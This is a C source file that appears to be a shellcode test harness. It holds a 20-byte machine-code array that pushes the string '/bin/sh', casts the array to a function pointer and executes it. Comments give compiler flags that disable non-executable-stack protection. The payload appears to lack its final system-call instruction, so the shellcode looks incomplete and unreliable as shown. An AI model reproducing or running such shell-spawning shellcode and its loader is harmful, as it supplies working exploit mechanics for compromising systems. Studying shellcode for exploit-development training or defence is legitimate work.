#include<stdio.h>
#include<string.h>

// Compile with the following: gcc -z execstack shellcode.c
// gcc -m32 -z execstack shellcode.c
int main(int argc, char **argv) {
  unsigned char code[] = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x54\x5b\x56\x58\x34\x20\x34\x2b";

  int foo_value = 0;
  printf("length of the shellcode is: %d\n", (int)sizeof(code)-1);

  int (*foo)() = (int(*)())code;
  foo_value = foo();

	printf("shellcode execution complete\n");
	return 0;
}
